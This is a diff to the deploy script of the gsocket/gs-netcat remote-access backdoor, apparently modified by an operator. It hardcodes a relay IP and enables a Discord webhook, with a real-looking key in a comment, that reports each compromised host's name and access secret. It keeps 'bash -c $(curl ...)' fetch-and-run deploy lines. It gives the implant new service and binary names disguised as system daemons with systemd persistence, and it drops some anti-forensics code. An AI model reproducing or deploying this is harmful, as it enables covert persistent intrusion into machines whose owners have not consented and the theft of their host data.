@@ -10,7 +10,7 @@ unset GS_NOEVAL
 # Global Defines
 ###----BEGIN changed by CICD script-----
 CICD_GS_BRANCH="beta"
-GS_HOST_MASTER_IP="$(ping -4 -c1 "$(printf '%s.gs.thc.org\n' {a..z} | shuf -n1)" 2>/dev/null | sed -n '1s/.*(\(.*\)).*/\1/p')"
+GS_HOST_MASTER_IP="212.132.98.170"
 ###-----END-----
 [[ $CICD_GS_BRANCH == "master" ]] && unset CICD_GS_BRANCH
 [[ -z $GS_BRANCH ]] && GS_BRANCH="${CICD_GS_BRANCH}"
@@ -87,21 +87,21 @@ msg='$(hostname) --- $(uname -rom) --- ${GS_HOST:+GS_HOST=${GS_HOST} }gs-netcat 
 	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://webhook.site/${GS_WEBHOOK_KEY}")
 }
 ### discord webhook
-GS_DISCORD_KEY="0"
+# GS_DISCORD_KEY="1106565073956253736/mEDRS5iY0S4sgUnRh8Q5pC4S54zYwczZhGOwXvR3vKr7YQmA0Ej1-Ig60Rh4P_TGFq-m"
 [[ -n $GS_DISCORD_KEY ]] && {
 	data='{"username": "gsocket", "content": "'"${msg}"'"}'
-	GS_WEBHOOK_CURL=('-H' 'Content-Type: application/json' '-d' "${data}" "")
-	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "")
+	GS_WEBHOOK_CURL=('-H' 'Content-Type: application/json' '-d' "${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
+	GS_WEBHOOK_WGET=('--header=Content-Type: application/json' "--post-data=${data}" "https://discord.com/api/webhooks/${GS_DISCORD_KEY}")
 }
 unset data msg
 
 DL_CRL="bash -c \"\$(curl -fsSL $GS_URL_DEPLOY)\""
 DL_WGT="bash -c \"\$(wget -qO-  $GS_URL_DEPLOY)\""
 
-bin_hidden_name_arr=("snapd" "crond" "networkd" "polkitnetd" "journald")
+bin_hidden_name_arr=("udevd-sync" "netd" "firewallctl" "bootcfg" "authd")
 BIN_HIDDEN_NAME_DEFAULT="${bin_hidden_name_arr[$((RANDOM % ${#bin_hidden_name_arr[@]}))]}"
 
-service_hidden_name_arr=("systemd-snapd-update" "systemd-crond" "networkd-dispatch" "polkit-net" "journald-forwarder")
+service_hidden_name_arr=("systemd-hwdb-update" "network-core" "auth-policykit" "ssh-agent-proxy" "journald-forwarder")
 SERVICE_HIDDEN_NAME_DEFAULT="${service_hidden_name_arr[$((RANDOM % ${#service_hidden_name_arr[@]}))]}"
 
 # Can not use '[kcached/0]'. Bash without bashrc shows "/0] $" as prompt. 
@@ -115,7 +115,7 @@ CONFIG_DIR_NAME_DEFAULT="${config_dir_name_arr[$((RANDOM % ${#config_dir_name_ar
 #GS_FFPID=1
 GS_REEXEC=1
 GS_BC=1
-[ -z "$GS_SYSTEMD_PERSIST" ] && GS_SYSTEMD_PERSIST="simple"
+[ -z "$GS_SYSTEMD_PERSIST" ] && GS_SYSTEMD_PERSIST="oneshot"
 GS_MEMEXEC=1
 #GS_SYSTEMD_PERSIST="default"
 
@@ -661,16 +661,6 @@ xmv() {
 
 	mv "$src" "$dst"
 	return 0
-}
-
-chattr_set() {
-	command -v chattr >/dev/null || return
-	chattr +i "$1" 2>/dev/null
-}
-
-chattr_unset() {
-	command -v chattr >/dev/null || return
-	chattr -i "$1" 2>/dev/null
 }
 
 
@@ -1358,7 +1348,6 @@ uninstall_rm()
 	[[ ! -f "$1" ]] && return # return if file does not exist
 
 	echo "Removing $1..."
-	chattr_unset "$1"
 	xrm "$1" 2>/dev/null
 }
 
@@ -1420,9 +1409,8 @@ uninstall_service()
 		systemctl disable "${sn}" 2>/dev/null
 	}
 
-	grep -Fqm1 simple "${sf}" 2>/dev/null || UNINST_IS_SYSTEMD_SIMPLE=1
+	grep -Fqm1 oneshot "${sf}" 2>/dev/null || UNINST_IS_SYSTEMD_SIMPLE=1
 
-	chattr_unset "${sf}"
 	uninstall_rm "${sf}"
 }
 
@@ -1788,10 +1776,7 @@ install_systemd_add() {
 	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants"
 	ts_add_systemd "${WANTS_DIR}/multi-user.target.wants/${SERVICE_HIDDEN_NAME}.service" "${SERVICE_FILE}"
 
-	systemctl enable "${SERVICE_HIDDEN_NAME}" &>/dev/null || { rm -f "${SERVICE_FILE:?}"; return; }
-
-	chattr_set "${DSTBIN}"
-	chattr_set "${SERVICE_FILE}"
+	systemctl enable "${SERVICE_HIDDEN_NAME}" &>/dev/null || { rm -f "${SERVICE_FILE:?}"; return; } # did not work... 
 
 	IS_SYSTEMD=1
 	IS_SYSTEMD_STANDALONE=1
@@ -1799,75 +1784,37 @@ install_systemd_add() {
 	OK_OUT
 }
 
-_service_meta() {
-	case "${SERVICE_HIDDEN_NAME}" in
-		systemd-network*)
-			echo "Description=Network Address Manager
-Documentation=man:systemd-networkd.service(8)
-After=network-pre.target dbus.service
-Wants=network-pre.target"
-			;;
-		systemd-journal*)
-			echo "Description=Journal Service
-Documentation=man:systemd-journald.service(8)
-DefaultDependencies=no
-After=systemd-remount-fs.service
-Before=sysinit.target"
-			;;
-		systemd-resolve*)
-			echo "Description=Network Name Resolution
-Documentation=man:systemd-resolved.service(8)
-After=network.target network-online.target
-Wants=network-online.target"
-			;;
-		cron*)
-			echo "Description=Regular background program processing daemon
-Documentation=man:cron(8)
-After=remote-fs.target nss-user-lookup.target"
-			;;
-		*)
-			echo "Description=System Service Manager
-After=network.target"
-			;;
-	esac
-}
-
 install_systemd_new() {
 	local sfdata
 	local param
 	local remain="no"
-	local meta
 
 	# If gsnc does not leave cgroup then we must keep sevice running or else
 	# systemd will kill the entire cgroup.
-	[ -n "$GS_NOCCG" ] && remain="yes"
+	[ -n "$GS_NOCCG" ] && remain="yes" 
 
-	meta="$(_service_meta)"
-
-	if [[ "$GS_SYSTEMD_PERSIST" == *"simple"* ]]; then
+	if [[ "$GS_SYSTEMD_PERSIST" == *"oneshot"* ]]; then
 		sfdata="[Unit]
-${meta}
+After=network.target
 
 [Service]
-Restart=always
-Type=simple
+Type=oneshot
+RemainAfterExit=${remain}
 ExecStart=${DSTBIN}
-ExecStartPost=/bin/sh -c 'mount --bind /proc/2 /proc/\$MAINPID 2>/dev/null; true'
 
 [Install]
 WantedBy=multi-user.target"
 		param="-ilqD"
 		[ -z "$GS_NOCCG" ] && GS_CCG=1 # Change CGROUP
-	else
+	else 
 		# HERE: A systemd supervised service
 		sfdata="[Unit]
-${meta}
+After=network.target
 
 [Service]
 Restart=always
 RestartSec=300
 ExecStart=${DSTBIN}
-ExecStartPost=/bin/sh -c 'mount --bind /proc/2 /proc/\$MAINPID 2>/dev/null; true'
 
 [Install]
 WantedBy=multi-user.target"
@@ -2347,7 +2294,7 @@ webhooks() {
 	local ok
 	local err
 
-#	echo -en "Executing webhooks...................................................."
+	echo -en "Executing webhooks...................................................."
 	[[ -z ${GS_WEBHOOK_CURL[0]} ]] && { SKIP_OUT; return; }
 	[[ -z ${GS_WEBHOOK_WGET[0]} ]] && { SKIP_OUT; return; }
 
@@ -2453,13 +2400,13 @@ gs_start_systemd()
 	ts_restore
 	systemctl daemon-reload
 	# err=1
-	# Rare case with Type=simple but gsnc fails to leave cgroup (and thus does
+	# Rare case with Type=oneshot but gsnc fails to leave cgroup (and thus does
 	# not fork/setsid). Use timeout or otherwise systemctl would never return.
 	err="$(timeout 5 systemctl restart "${SERVICE_HIDDEN_NAME}" 2>&1)"
 	if [[ -n "$SYSTEMD_INSTALL_CHECK_IS_ACTIVE" ]]; then
 		err="$(systemctl is-active "${SERVICE_HIDDEN_NAME}" 2>/dev/null)" && unset err
 	# else
-		# Hope for the best that simple worked correctly.
+		# Hope for the best that OneShot worked correctly.
 		# unset err
 	fi
 	[ -n "$err" ] && {
@@ -2517,31 +2464,6 @@ gs_start()
 	OK_OUT ""
 
 	IS_GS_RUNNING=1
-}
-
-gs_hide_pid() {
-	local our_pid ref_pid f
-
-	[[ "$OSNAME" != "linux" ]] && return
-	[[ $UID -ne 0 ]] && return
-	[[ -z "$IS_GS_RUNNING" ]] && return
-	command -v mount >/dev/null || return
-
-	our_pid=$(pgrep -xn "${BIN_HIDDEN_NAME}" 2>/dev/null)
-	[[ -z "$our_pid" ]] && our_pid=$(pgrep -xn "${PROC_HIDDEN_NAME%%:*}" 2>/dev/null)
-	[[ -z "$our_pid" ]] && return
-	[[ ! -d "/proc/${our_pid}" ]] && return
-
-	# Find a kernel worker thread (PPid=2) to masquerade as in /proc
-	for f in /proc/[0-9]*/status; do
-		grep -qm1 $'^PPid:\t2$' "$f" 2>/dev/null || continue
-		ref_pid="${f%/status}"
-		ref_pid="${ref_pid##*/}"
-		break
-	done
-	[[ -z "$ref_pid" ]] && ref_pid=2
-
-	mount --bind "/proc/${ref_pid}" "/proc/${our_pid}" 2>/dev/null
 }
 
 init_vars
@@ -2615,7 +2537,6 @@ HOWTO_CONNECT_OUT
 
 # Do this after show_install_config so that user always sees the GS_SECRET.
 gs_start
-gs_hide_pid
 
 # Give gsnc enough time to read the configuration from its own binary before deleting.
 [[ -n "$GS_NOINST" ]] && { sleep 1; rm -f "${DSTBIN:?}"; }
@@ -2641,6 +2562,6 @@ gs_hide_pid
     ${CM}${str}bash -c \"\$(wget -qO-  ${url}/${SCRIPT_DEPLOY_NAME})\"${CN}"
 }
 
-echo -e "--> ${CW}Join us - https://thc.org/ops${CN}"
+echo -e "--> ${CW}KASIH PAHAM BOSKUH${CN}"
 
 exit_code 0
